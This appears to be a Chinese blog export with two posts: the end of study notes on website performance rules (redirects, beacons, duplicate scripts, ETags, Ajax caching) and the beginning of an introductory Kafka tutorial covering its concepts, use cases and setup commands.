<p>如果使用Apache2.0中的处理器，一种更为清晰的解决方案是使用DirectorySlash指令。假设有一个名为astrologyhandler的处理器，可以像下面这样使用DirectorySlash<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Localtion</span> /<span class="attr">astrology</span>&gt;</span></span><br><span class="line">    DirectorySlash Off</span><br><span class="line">    SetHandler astrologyhandler</span><br><span class="line"><span class="tag">&lt;/<span class="name">Localtion</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这些方法都不能解决查找与当期目录相关的url问题，因此页面中组件的url必须与根目录相关。而且，你还必须知道各模块运行的顺序（尤其是mod_dir和mod_autoindex）,因为这样使用DirectorySlash可能会有安全隐患。</p>
<p>总之，如果你的网站包含目录并使用了自动索引，用户就必须忍受一个到达预期页面的重定向。检查一下你的web日志就能看到发出了多少301状态，这能帮助你认识到多么值得去解决缺少结尾斜线的问题。</p>
<h2 id="连接网站"><a href="#连接网站" class="headerlink" title="连接网站"></a>连接网站</h2><p>想象一下网站后端被重写的情形。这经常发生，新的实现中的url很可能会有所不同。将用户从旧的url转移到新的url的最简单的方式就是重定向。重定向是使用定义良好的API——url来整合两个代码基础的一种方式。</p>
<p>将旧网站连接到新网站只是重定向这种常见应用中的表现形式之一。其他形式还包括将一个网站的不同部分连接起来，以及基于一些条件（浏览器类型、用户账户类型等）来引导用户。使用重定向来连接两个网站很简单而且只需要很少的额外代码。</p>
<p>其实整合后端还有其他的选择，但比重定向需要更多的开发工作，不过这样不会损害用户体验。</p>
<p>1.Alias、mod_rewrite和DirectorySlash要求除url之外还要提交到一个接口（处理器或文件名），但易于实现。<br>2.如果两个后端位于同一台服务器，则它们的代码很可能自己就能连接。例如，旧的处理器代码可以通过编程调用新的处理器代码。<br>3.如果域名变了，可以使用一个CNAME（一条DNS记录，用于创建从一个域名指向另一个域名的别名）让两个主机名指向相同的服务器。如果能做到这一点，这里提到的技术（Alias、mod_rewrite、DirectorySlash和直接连接代码）就是可行的。</p>
<h2 id="跟踪内部流量"><a href="#跟踪内部流量" class="headerlink" title="跟踪内部流量"></a>跟踪内部流量</h2><p>重定向经常用于跟踪用户流量的流向。例如，sports链接的url是<a href="http://www.yahoo.com/r/26.单击这个链接将产生301响应，其Location被设置为http://sports.yahoo.com/。通过分析来自www.yahoo.com的web服务器日志可以得知人们离开Yahoo!的首页后的流量去向。" target="_blank" rel="noopener">http://www.yahoo.com/r/26.单击这个链接将产生301响应，其Location被设置为http://sports.yahoo.com/。通过分析来自www.yahoo.com的web服务器日志可以得知人们离开Yahoo!的首页后的流量去向。</a></p>
<p>另一种选择是使用Referer日志来跟踪流量去向。每个http请求都包含一个url，表明从哪个页面发起的请求，也就是引用方（有的时候没有引用页，当用户键入url或使用书签时）。在这里，当用户从Yahoo!主页导航到Sports页时，sports.yahoo.com的访问日志中会包含一个Referer，其值为<a href="http://www/yahoo.com/。" target="_blank" rel="noopener">http://www/yahoo.com/。</a></p>
<h2 id="跟踪出站流量"><a href="#跟踪出站流量" class="headerlink" title="跟踪出站流量"></a>跟踪出站流量</h2><p>出站流量使用referer就不太现实了<br>Yahoo!search目前将每个搜索结果链接包装到一个重定向中来解决跟踪的问题。搜索结果的url都指向rds.yahoo.com并将最终的目标当作参数包含在该url中。例如，下面是指向wikipedia的“Performance”词条的搜索结果链接<br><a href="http://rds.yahoo.com/[...]5742/**http%3a/en.wikipedia.org/wiki/Performance" target="_blank" rel="noopener">http://rds.yahoo.com/[...]5742/**http%3a/en.wikipedia.org/wiki/Performance</a><br>单击这个搜索结果会访问rds.yahoo.com，它将返回一个302响应，其Location被设置为<a href="http://en.wikipedia.org/wiki/Performance.管理员通过分析rds.yahoo.com上的web服务器日志的**参数就能跟踪用户去了哪里。这个重定向使得获取目标页面变慢了。" target="_blank" rel="noopener">http://en.wikipedia.org/wiki/Performance.管理员通过分析rds.yahoo.com上的web服务器日志的**参数就能跟踪用户去了哪里。这个重定向使得获取目标页面变慢了。</a></p>
<p>除了重定向，还可以选择信标——一个http请求，其url中包含有跟踪信息。跟踪信息可以从信标web服务器的访问日志中提取出来。信标响应通常是一个1px*1px的透明图片；不过204响应更为优秀，因为它更小，从来不会被缓存，而且绝对不会改变浏览器状态。<br>在Yahoo!search,目标是无论何时用户单击搜索结果链接时都要发送一个信标。这通过为每个连接提供onClick处理器来完成（当启用了javascript时）。onclick处理器将调用一个函数，请求一个图片，并在图片的url中包含要跟踪的信息。<br><img src="https://mfaying.github.io/static/images/高性能网站建设指南/10.jpg" alt="avatar"><br>这种情况下，挑战是发送信标和页面自身被卸载之间的竞态情形。图片信标的onload处理器可以用于确保在卸载文档之前信标应传送完毕。<br><img src="https://mfaying.github.io/static/images/高性能网站建设指南/11.jpg" alt="avatar"><br>这种方法可能和使用重定向一样慢，另一种方式是使用XMLHttpRequest来发送信标，但在卸载页面之前只需等请求到达readyState 2即可。这比等待重定向的整个http响应要快，但你必须决定是否有必要采取这么复杂的方式。</p>
<h2 id="美化URL"><a href="#美化URL" class="headerlink" title="美化URL"></a>美化URL</h2><p>使用重定向的另一种动机是使url更加美观并且易于记忆。如<a href="http://www.google.com/tools/firfox/toolbar/FT3/intl/en/index.html" target="_blank" rel="noopener">http://www.google.com/tools/firfox/toolbar/FT3/intl/en/index.html</a> -&gt; <a href="http://www.google.com" target="_blank" rel="noopener">http://www.google.com</a>.<br>但是，使用alias、mod_rewrite、DirectorySlash和直接链接代码来避免重定向也能达到目的。</p>
<h1 id="规则12——移除重复脚本"><a href="#规则12——移除重复脚本" class="headerlink" title="规则12——移除重复脚本"></a>规则12——移除重复脚本</h1><p>导致一个脚本的重复有两个主要因素——团队大小和脚本数量</p>
<p>重复脚本损伤性能的方式有两种——不必要的http请求和执行JavaScript所浪费的时间。</p>
<h2 id="避免重复脚本"><a href="#避免重复脚本" class="headerlink" title="避免重复脚本"></a>避免重复脚本</h2><p>第一种方法是，实现一个脚本管理模块。包含脚本的典型方式是在html页面中使用script标签——<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"menu_1.0.17.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>另一种选择是在php中创建一个称作insertScript的函数<br>&lt;?php insertScript(“menu.js”) ?&gt;<br><img src="https://mfaying.github.io/static/images/高性能网站建设指南/12.jpg" alt="avatar"></p>
<h1 id="规则13——配置ETag"><a href="#规则13——配置ETag" class="headerlink" title="规则13——配置ETag"></a>规则13——配置ETag</h1><h2 id="Etag是什么？"><a href="#Etag是什么？" class="headerlink" title="Etag是什么？"></a>Etag是什么？</h2><p>实体标签是web服务器和浏览器用于确认缓存组件的有效性的一种机制。</p>
<p>发送条件get请求是，服务器在检测缓存的组件是否和原始服务器上的组件匹配时有两种方式——<br>1.比较最新修改日期<br>2.比较实体标签</p>
<p>原始服务器通过Last-Modified响应头来返回组件的最新修改日期</p>
<p>下一次请求是浏览器会使用If-Modified-Since头将最新修改日期传回到原始服务器以进行比较。如果匹配，会返回一个304 Not Modified</p>
<h2 id="实体标签"><a href="#实体标签" class="headerlink" title="实体标签"></a>实体标签</h2><p>ETag提供了另外一种方式，Etag在http1.1中引入，标识了一个组件的一个特定版本的字符串。唯一的格式约束是该字符串必须用引号引起来。原始服务器使用Etag响应头来指定组件的Etag<br><img src="https://mfaying.github.io/static/images/高性能网站建设指南/13.jpg" alt="avatar"></p>
<p>Etag的加入为验证实体提供了比最新修改日期更为灵活的机制。例如，如果实体依据User-Agent或Accept-Language头而改变，实体的状态可以反映在Etag中。</p>
<p>此后，浏览器会使用If-None-Match头将ETag传回原始服务器。如果Etag是匹配的，就会返回304状态码。<br><img src="https://mfaying.github.io/static/images/高性能网站建设指南/14.jpg" alt="avatar"></p>
<h2 id="ETag带来的问题"><a href="#ETag带来的问题" class="headerlink" title="ETag带来的问题"></a>ETag带来的问题</h2><p>Etag的问题在于，通常使用组件的某些属性来改造它，这些属性对于特定的、寄宿了网站的服务器来说是唯一的。当浏览器从一台服务器上获取了原始组件，之后，又向另外一台不同的服务器发起条件GET请求时，Etag是不会匹配的——而对于使用服务器的集群来处理请求的网站来说，这是很常见的一种情况。</p>
<p>Apache1.3和2.x的ETag格式是inode-size-timestamp。文件系统使用inode来存储诸如文件类型、所有者、组合访问模式等信息。尽管在多台服务器上一个给定的文件可能位于相同的目录、具有相同的文件大小、权限、时间戳等，从一台服务器到另一台服务器，其inode仍然是不同的。</p>
<p>IIS5.0和6.0在Etag上有类似的问题。IIS上Etag的格式是filetimestamp:changeNumber。changeNumber适用于跟踪IIS配置变化的计数器。对于一个网站背后的所有IIS服务器来说，changeNumber不大可能相同。</p>
<p>最后的结果是对于完全相同的组件，从一台服务器到另一台，apache和IIS产生的Etag是不会匹配的。如果Etag不匹配，用户就不会按照Etage的设计计划那样接收到更小更快的304响应。</p>
<p>If-None-Match比If-Modified-Since具有更高的优先级。如果请求中同时出现了这两个头，则原始服务器“禁止返回304”，除非请求中的条件头字段一致。</p>
<h2 id="Etag——用还是不用"><a href="#Etag——用还是不用" class="headerlink" title="Etag——用还是不用"></a>Etag——用还是不用</h2><p>一种选择是对Etag进行配置，以利用其灵活的验证能力。例如可以使用一段根据浏览器是否为IE而变化的脚本。如果使用PHP来生成脚本，你可以通过设置Etag头来反映浏览器状态。<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ( strops($_SERVER[<span class="string">"HTTP_USER_AGENT"</span>], <span class="string">"MSIE"</span>) ) &#123;</span><br><span class="line">    header(<span class="string">"ETag: MSIE"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">"Etag: notMSIE"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>如果你的组件必须通过最新修改日期之外的一些东西来进行验证，则Etag是一种强大的方法。</p>
<p>如果你无须自定义Etag,最好简单地将其移除。Apache和IIS都将Etag视为一个性能问题，并建议修改Etage的内容。</p>
<p>Apache1.3.23版和之后版本支持FileEtag指令。使用这一指令，可以从ETag中移除inode值，只留下大小和时间戳作为组件的Etag。类似的，在IIS中可以为所有服务器设置相同的ChangeNumber,保留文件的时间戳作为Etag中仅有的另一块信息。然而Last-Modified头可以提供完全等价的信息，而且移除Etag可以减小响应和后续请求的Http头的大小。</p>
<p>在Apache中，只需向Apache配置文件中简单地添加下面一行配置就能移除Etag——<br>FileEtag none</p>
<h1 id="规则14——使Ajax可缓存"><a href="#规则14——使Ajax可缓存" class="headerlink" title="规则14——使Ajax可缓存"></a>规则14——使Ajax可缓存</h1><p>Ajax</p>
<p>术语ajax由Jesse James Garrett于2005年提出，Ajax表示“异步的JavaScript和XML”。Ajax不是一个单独的，需要许可证的技术，而是一组技术，包括JavaScript、CSS、DOM和异步数据获取。Ajax的目的是为了突破Web本质的开始-停止交互方式。向用户显示一个白屏然后重绘整个页面不是一种很好地用户体验。而Ajax在UI和Web服务器之间插入了一层。这个Ajax层位于客户端，与Web服务器进行交互以获取请求的信息，并与表现层交互，仅更新那些必要的组件。它将web体验从“浏览页面”转变为“与应用程序进行交互”。</p>
<h2 id="现实世界中的Ajax缓存"><a href="#现实世界中的Ajax缓存" class="headerlink" title="现实世界中的Ajax缓存"></a>现实世界中的Ajax缓存</h2><p>重复请求两次Yahoo!Mail消息列表，并没有被缓存，没有被缓存的原因是响应中包含一个值为no-store的Cache-Control头，以及一个日期为过去某一天的Expires头。这些都告诉浏览器不要缓存响应。</p>
<p>使这些Ajax请求可缓存，除了改变HTTP头之外还需要进行更多的工作。响应的个性化和动态本质必须被反映到缓存中。可供采用的最好的方式是使用查询字符串参数。例如，这个响应只对当前用户有效。可以将用户名放到查询字符串中来做到这一点——<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/ws/mail/v1/formrpc?m=GetMessage&amp;yid=steve_souders&amp;msgid=001234</span><br></pre></td></tr></table></figure></p>
<p>该响应可能会因为数据隐私原因而不能缓存。当数据被认为是私有的时，大多会使用Cache-Control: no-store。在使用了这个头之后，响应根本就不会被写入到磁盘上。但是，HTTP规范警告说不要依赖这一机制来确保数据的隐私性，恶意的或危险的缓存会完全忽略Cache-Control: no-store头。</p>
<p>处理数据隐私性的另外一个更好的方式是使用安全通信协议如SSL。SSL响应是可缓存的，因此它提供了一种妥协——在确保数据隐私的同时在当前会话中缓存响应以改善用户体验。</p>
<p>和Yahoo!Mail示例类似的例子，缓存一个电子表格，如果用户修改了该电子表格，我们必须确保产生变化后不会再使用缓存的请求。简单的解决方法还是使用查询字符串。Googole Spreadsheets的后端应该具有一个时间戳，来表示末次修改发生的时间，并将其嵌入到Ajax请求的查询字符串中——<br>/ar?id=[snip…]&amp;srow=0&amp;erow=100&amp;t=1177458941</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>性能</tag>
      </tags>
  </entry>
  <entry>
    <title>kafka入门介绍</title>
    <url>/2019/05/11/kafka%E5%85%A5%E9%97%A8%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<p><a href="https://www.cnblogs.com/xiaodf/p/6093261.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaodf/p/6093261.html</a></p>
<p><a href="http://orchome.com/3" target="_blank" rel="noopener">原文</a>，该教程未全部阅读(阅读至配置)，发现教程有许多地方介绍得不仔细或者不容易理解，有时间需要找找其它资料才能系统地学习一遍。但是对于理解kafka的一些概念，作为入门还是有一些帮助的。</p>
<h1 id="kafka入门介绍"><a href="#kafka入门介绍" class="headerlink" title="kafka入门介绍"></a>kafka入门介绍</h1><h2 id="Kafka作为一个分布式的流平台，这到底意味着什么？"><a href="#Kafka作为一个分布式的流平台，这到底意味着什么？" class="headerlink" title="Kafka作为一个分布式的流平台，这到底意味着什么？"></a>Kafka作为一个分布式的流平台，这到底意味着什么？</h2><p>我们认为，一个流处理平台具有三个关键能力：</p>
<p>1.发布和订阅消息（流），在这方面，它类似于一个消息队列或企业消息系统。<br>2.以容错的方式存储消息（流）。<br>3.在消息流发生时处理它们。<br><a id="more"></a><br>什么是kakfa的优势？</p>
<p>它应用于2大类应用：</p>
<p>1.构建实时的流数据管道，可靠地获取系统和应用程序之间的数据。<br>2.构建实时流的应用程序，对数据流进行转换或反应。</p>
<p>要了解kafka是如何做这些事情的，让我们从下到上深入探讨kafka的能力。</p>
<p>首先几个概念：</p>
<p>1.kafka作为一个集群运行在一个或多个服务器上。<br>2.kafka集群存储的消息是以topic为类别记录的。<br>3.每个消息（也叫记录record，我习惯叫消息）是由一个key，一个value和时间戳构成。</p>
<p>kafka有四个核心API：</p>
<p>1.应用程序使用 Producer API 发布消息到1个或多个topic（主题）。<br>2.应用程序使用 Consumer API 来订阅一个或多个topic，并处理产生的消息。<br>3.应用程序使用 Streams API 充当一个流处理器，从1个或多个topic消费输入流，并生产一个输出流到1个或多个输出topic，有效地将输入流转换到输出流。<br>4.Connector API允许构建或运行可重复使用的生产者或消费者，将topic连接到现有的应用程序或数据系统。例如，一个关系数据库的连接器可捕获每一个变化。<br><img src="https://mfaying.github.io/images/kafka/1.jpg" alt="avatar"><br>Client和Server之间的通讯，是通过一条简单、高性能并且和开发语言无关的TCP协议。并且该协议保持与老版本的兼容。Kafka提供了Java Client（客户端）。除了Java Client外，还有非常多的其它编程语言的Client。</p>
<h2 id="首先来了解一下Kafka所使用的基本术语："><a href="#首先来了解一下Kafka所使用的基本术语：" class="headerlink" title="首先来了解一下Kafka所使用的基本术语："></a>首先来了解一下Kafka所使用的基本术语：</h2><p>Topic</p>
<p>Kafka将消息种子(Feed)分门别类，每一类的消息称之为一个主题(Topic).</p>
<p>Producer</p>
<p>发布消息的对象称之为主题生产者(Kafka topic producer)</p>
<p>Consumer</p>
<p>订阅消息并处理发布的消息的种子的对象称之为主题消费者(consumers)</p>
<p>Broker</p>
<p>已发布的消息保存在一组服务器中，称之为Kafka集群。集群中的每一个服务器都是一个代理(Broker). 消费者可以订阅一个或多个主题（topic），并从Broker拉数据，从而消费这些已发布的消息。</p>
<h2 id="主题和日志-Topic和Log"><a href="#主题和日志-Topic和Log" class="headerlink" title="主题和日志 (Topic和Log)"></a>主题和日志 (Topic和Log)</h2><p>让我们更深入的了解Kafka中的Topic。</p>
<p>Topic是发布的消息的类别或者种子Feed名。对于每一个Topic，Kafka集群维护这一个分区的log，就像下图中的示例：<br><img src="https://mfaying.github.io/images/kafka/2.jpg" alt="avatar"><br>每一个分区都是一个顺序的、不可变的消息队列， 并且可以持续的添加。分区中的消息都被分了一个序列号，称之为偏移量(offset)，在每个分区中此偏移量都是唯一的。</p>
<p>Kafka集群保持所有的消息，直到它们过期， 无论消息是否被消费了。 实际上消费者所持有的仅有的元数据就是这个偏移量，也就是消费者在这个log中的位置。 这个偏移量由消费者控制：正常情况当消费者消费消息的时候，偏移量也线性的的增加。但是实际偏移量由消费者控制，消费者可以将偏移量重置为更老的一个偏移量，重新读取消息。 可以看到这种设计对消费者来说操作自如， 一个消费者的操作不会影响其它消费者对此log的处理。 再说说分区。Kafka中采用分区的设计有几个目的。一是可以处理更多的消息，不受单台服务器的限制。Topic拥有多个分区意味着它可以不受限的处理更多的数据。第二，分区可以作为并行处理的单元，稍后会谈到这一点。<br><img src="https://mfaying.github.io/images/kafka/3.jpg" alt="avatar"></p>
<h2 id="分布式-Distribution"><a href="#分布式-Distribution" class="headerlink" title="分布式(Distribution)"></a>分布式(Distribution)</h2><p>Log的分区被分布到集群中的多个服务器上。每个服务器处理它分到的分区。 根据配置每个分区还可以复制到其它服务器作为备份容错。 每个分区有一个leader，零或多个follower。Leader处理此分区的所有的读写请求，而follower被动的复制数据。如果leader宕机，其它的一个follower会被推举为新的leader。 一台服务器可能同时是一个分区的leader，另一个分区的follower。 这样可以平衡负载，避免所有的请求都只让一台或者某几台服务器处理。</p>
<h2 id="Geo-Replication-异地数据同步技术"><a href="#Geo-Replication-异地数据同步技术" class="headerlink" title="Geo-Replication(异地数据同步技术)"></a>Geo-Replication(异地数据同步技术)</h2><p>Kafka MirrorMaker为群集提供geo-replication支持。借助MirrorMaker，消息可以跨多个数据中心或云区域进行复制。 您可以在active/passive场景中用于备份和恢复; 或者在active/passive方案中将数据置于更接近用户的位置，或数据本地化。</p>
<h2 id="生产者-Producers"><a href="#生产者-Producers" class="headerlink" title="生产者(Producers)"></a>生产者(Producers)</h2><p>生产者往某个Topic上发布消息。生产者也负责选择发布到Topic上的哪一个分区。最简单的方式从分区列表中轮流选择。也可以根据某种算法依照权重选择分区。开发者负责如何选择分区的算法。</p>
<h2 id="消费者-Consumers"><a href="#消费者-Consumers" class="headerlink" title="消费者(Consumers)"></a>消费者(Consumers)</h2><p>通常来讲，消息模型可以分为两种， 队列和发布-订阅式。 队列的处理方式是 一组消费者从服务器读取消息，一条消息只有其中的一个消费者来处理。在发布-订阅模型中，消息被广播给所有的消费者，接收到消息的消费者都可以处理此消息。Kafka为这两种模型提供了单一的消费者抽象模型： 消费者组 （consumer group）。 消费者用一个消费者组名标记自己。 一个发布在Topic上消息被分发给此消费者组中的一个消费者。 假如所有的消费者都在一个组中，那么这就变成了queue模型。 假如所有的消费者都在不同的组中，那么就完全变成了发布-订阅模型。 更通用的， 我们可以创建一些消费者组作为逻辑上的订阅者。每个组包含数目不等的消费者， 一个组内多个消费者可以用来扩展性能和容错。正如下图所示：<br><img src="https://mfaying.github.io/images/kafka/4.jpg" alt="avatar"><br>正像传统的消息系统一样，Kafka保证消息的顺序不变。 再详细扯几句。传统的队列模型保持消息，并且保证它们的先后顺序不变。但是， 尽管服务器保证了消息的顺序，消息还是异步的发送给各个消费者，消费者收到消息的先后顺序不能保证了。这也意味着并行消费将不能保证消息的先后顺序。用过传统的消息系统的同学肯定清楚，消息的顺序处理很让人头痛。如果只让一个消费者处理消息，又违背了并行处理的初衷。 在这一点上Kafka做的更好，尽管并没有完全解决上述问题。 Kafka采用了一种分而治之的策略：分区。 因为Topic分区中消息只能由消费者组中的唯一一个消费者处理，所以消息肯定是按照先后顺序进行处理的。但是它也仅仅是保证Topic的一个分区顺序处理，不能保证跨分区的消息先后处理顺序。 所以，如果你想要顺序的处理Topic的所有消息，那就只提供一个分区。</p>
<h2 id="Kafka的保证-Guarantees"><a href="#Kafka的保证-Guarantees" class="headerlink" title="Kafka的保证(Guarantees)"></a>Kafka的保证(Guarantees)</h2><p>1.生产者发送到一个特定的Topic的分区上，消息将会按照它们发送的顺序依次加入，也就是说，如果一个消息M1和M2使用相同的producer发送，M1先发送，那么M1将比M2的offset低，并且优先的出现在日志中。<br>2.消费者收到的消息也是此顺序。<br>3.如果一个Topic配置了复制因子（replication factor）为N， 那么可以允许N-1服务器宕机而不丢失任何已经提交（committed）的消息。</p>
<h2 id="kafka作为一个消息系统"><a href="#kafka作为一个消息系统" class="headerlink" title="kafka作为一个消息系统"></a>kafka作为一个消息系统</h2><p>Kafka的流与传统企业消息系统相比的概念如何？</p>
<p>传统的消息有两种模式：队列和发布订阅。 在队列模式中，消费者池从服务器读取消息（每个消息只被其中一个读取）; 发布订阅模式：消息广播给所有的消费者。这两种模式都有优缺点，队列的优点是允许多个消费者瓜分处理数据，这样可以扩展处理。但是，队列不像多个订阅者，一旦消息者进程读取后故障了，那么消息就丢了。而发布和订阅允许你广播数据到多个消费者，由于每个订阅者都订阅了消息，所以没办法缩放处理。</p>
<p>kafka中消费者组有两个概念：队列：消费者组（consumer group）允许同名的消费者组成员瓜分处理。发布订阅：允许你广播消息给多个消费者组（不同名）。</p>
<p>kafka的每个topic都具有这两种模式。</p>
<p>kafka有比传统的消息系统更强的顺序保证。</p>
<p>传统的消息系统按顺序保存数据，如果多个消费者从队列消费，则服务器按存储的顺序发送消息，但是，尽管服务器按顺序发送，消息异步传递到消费者，因此消息可能乱序到达消费者。这意味着消息存在并行消费的情况，顺序就无法保证。消息系统常常通过仅设1个消费者来解决这个问题，但是这意味着没用到并行处理。</p>
<p>kafka做的更好。通过并行topic的parition —— kafka提供了顺序保证和负载均衡。每个partition仅由同一个消费者组中的一个消费者消费到。并确保消费者是该partition的唯一消费者，并按顺序消费数据。每个topic有多个分区，则需要对多个消费者做负载均衡，但请注意，相同的消费者组中不能有比分区更多的消费者，否则多出的消费者一直处于空等待，不会收到消息。</p>
<h2 id="kafka作为一个存储系统"><a href="#kafka作为一个存储系统" class="headerlink" title="kafka作为一个存储系统"></a>kafka作为一个存储系统</h2><p>所有发布消息到消息队列和消费分离的系统，实际上都充当了一个存储系统（发布的消息先存储起来）。Kafka比别的系统的优势是它是一个非常高性能的存储系统。</p>
<p>写入到kafka的数据将写到磁盘并复制到集群中保证容错性。并允许生产者等待消息应答，直到消息完全写入。</p>
<p>kafka的磁盘结构 - 无论你服务器上有50KB或50TB，执行是相同的。</p>
<p>client来控制读取数据的位置。你还可以认为kafka是一种专用于高性能，低延迟，提交日志存储，复制，和传播特殊用途的分布式文件系统。</p>
<h2 id="kafka的流处理"><a href="#kafka的流处理" class="headerlink" title="kafka的流处理"></a>kafka的流处理</h2><p>仅仅读，写和存储是不够的，kafka的目标是实时的流处理。</p>
<p>在kafka中，流处理持续获取输入topic的数据，进行处理加工，然后写入输出topic。例如，一个零售APP，接收销售和出货的输入流，统计数量或调整价格后输出。</p>
<p>可以直接使用producer和consumer API进行简单的处理。对于复杂的转换，Kafka提供了更强大的Streams API。可构建聚合计算或连接流到一起的复杂应用程序。</p>
<p>助于解决此类应用面临的硬性问题：处理无序的数据，代码更改的再处理，执行状态计算等。</p>
<p>Sterams API在Kafka中的核心：使用producer和consumer API作为输入，利用Kafka做状态存储，使用相同的组机制在stream处理器实例之间进行容错保障。</p>
<h2 id="拼在一起"><a href="#拼在一起" class="headerlink" title="拼在一起"></a>拼在一起</h2><p>消息传递，存储和流处理的组合看似反常，但对于Kafka作为流式处理平台的作用至关重要。</p>
<p>像HDFS这样的分布式文件系统允许存储静态文件来进行批处理。这样系统可以有效地存储和处理来自过去的历史数据。</p>
<p>传统企业的消息系统允许在你订阅之后处理未来的消息：在未来数据到达时处理它。</p>
<p>Kafka结合了这两种能力，这种组合对于kafka作为流处理应用和流数据管道平台是至关重要的。</p>
<p>批处理以及消息驱动应用程序的流处理的概念：通过组合存储和低延迟订阅，流处理应用可以用相同的方式对待过去和未来的数据。它是一个单一的应用程序，它可以处理历史的存储数据，当它处理到最后一个消息时，它进入等待未来的数据到达，而不是结束。</p>
<p>同样，对于流数据管道（pipeline），订阅实时事件的组合使得可以将Kafka用于非常低延迟的管道；但是，可靠地存储数据的能力使得它可以将其用于必须保证传递的关键数据，或与仅定期加载数据或长时间维护的离线系统集成在一起。流处理可以在数据到达时转换它。</p>
<h1 id="Kafka的使用场景"><a href="#Kafka的使用场景" class="headerlink" title="Kafka的使用场景"></a>Kafka的使用场景</h1><h2 id="消息"><a href="#消息" class="headerlink" title="消息"></a>消息</h2><p>kafka更好的替换传统的消息系统，消息系统被用于各种场景（解耦数据生产者，缓存未处理的消息，等），与大多数消息系统比较，kafka有更好的吞吐量，内置分区，副本和故障转移，这有利于处理大规模的消息。</p>
<p>根据我们的经验，消息往往用于较低的吞吐量，但需要低的端到端延迟，并需要提供强大的耐用性的保证。</p>
<p>在这一领域的kafka比得上传统的消息系统，如的ActiveMQ或RabbitMQ的。</p>
<h2 id="网站活动追踪"><a href="#网站活动追踪" class="headerlink" title="网站活动追踪"></a>网站活动追踪</h2><p>kafka原本的使用场景：用户的活动追踪，网站的活动（网页游览，搜索或其他用户的操作信息）发布到不同的话题中心，这些消息可实时处理，实时监测，也可加载到Hadoop或离线处理数据仓库。</p>
<p>每个用户页面视图都会产生非常高的量。</p>
<h2 id="指标"><a href="#指标" class="headerlink" title="指标"></a>指标</h2><p>kafka也常常用于监测数据。分布式应用程序生成的统计数据集中聚合。</p>
<h2 id="日志聚合"><a href="#日志聚合" class="headerlink" title="日志聚合"></a>日志聚合</h2><p>许多人使用Kafka作为日志聚合解决方案的替代品。日志聚合通常从服务器中收集物理日志文件，并将它们放在中央位置（可能是文件服务器或HDFS）进行处理。Kafka抽象出文件的细节，并将日志或事件数据更清晰地抽象为消息流。这允许更低延迟的处理并更容易支持多个数据源和分布式数据消费。</p>
<h2 id="流处理"><a href="#流处理" class="headerlink" title="流处理"></a>流处理</h2><p>kafka中消息处理一般包含多个阶段。其中原始输入数据是从kafka主题消费的，然后汇总，丰富，或者以其他的方式处理转化为新主题，例如，一个推荐新闻文章，文章内容可能从“articles”主题获取；然后进一步处理内容，得到一个处理后的新内容，最后推荐给用户。这种处理是基于单个主题的实时数据流。从0.10.0.0开始，轻量，但功能强大的流处理，就可以这样进行数据处理了。</p>
<p>除了Kafka Streams，还有Apache Storm和Apache Samza可选择。</p>
<h2 id="事件采集"><a href="#事件采集" class="headerlink" title="事件采集"></a>事件采集</h2><p>事件采集是一种应用程序的设计风格，其中状态的变化根据时间的顺序记录下来，kafka支持这种非常大的存储日志数据的场景。</p>
<h2 id="提交日志"><a href="#提交日志" class="headerlink" title="提交日志"></a>提交日志</h2><p>kafka可以作为一种分布式的外部日志，可帮助节点之间复制数据，并作为失败的节点来恢复数据重新同步，kafka的日志压缩功能很好的支持这种用法，这种用法类似于Apacha BookKeeper项目。</p>
<h1 id="kafka安装和启动"><a href="#kafka安装和启动" class="headerlink" title="kafka安装和启动"></a>kafka安装和启动</h1><h2 id="step1-下载代码"><a href="#step1-下载代码" class="headerlink" title="step1: 下载代码"></a>step1: 下载代码</h2><p>去官网下载1.1.0版本并且解压它。 <a href="http://kafka.apache.org/downloads.html" target="_blank" rel="noopener">http://kafka.apache.org/downloads.html</a><br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&gt; tar -xzf kafka_2.11-1.1.0.tgz</span><br><span class="line">&gt; <span class="built_in">cd</span> kafka_2.11-1.1.0</span><br></pre></td></tr></table></figure></p>
<h2 id="step2-启动服务"><a href="#step2-启动服务" class="headerlink" title="step2: 启动服务"></a>step2: 启动服务</h2><p>运行kafka需要使用Zookeeper，所以你需要先启动Zookeeper，如果你没有Zookeeper，你可以使用kafka自带打包和配置好的Zookeeper。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&gt; bin/zookeeper-server-start.sh config/zookeeper.properties</span><br><span class="line">[2013-04-22 15:01:37,495] INFO Reading configuration from: config/zookeeper.properties (org.apache.zookeeper.server.quorum.QuorumPeerConfig)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>现在启动kafka服务<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&gt; bin/kafka-server-start.sh config/server.properties &amp;</span><br><span class="line">[2013-04-22 15:01:47,028] INFO Verifying properties (kafka.utils.VerifiableProperties)</span><br><span class="line">[2013-04-22 15:01:47,051] INFO Property socket.send.buffer.bytes is overridden to 1048576 (kafka.utils.VerifiableProperties)</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<h2 id="step2-创建一个主题-topic"><a href="#step2-创建一个主题-topic" class="headerlink" title="step2: 创建一个主题(topic)"></a>step2: 创建一个主题(topic)</h2><p>创建一个名为“test”的Topic，只有一个分区和一个备份：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; bin/kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic test</span><br></pre></td></tr></table></figure></p>
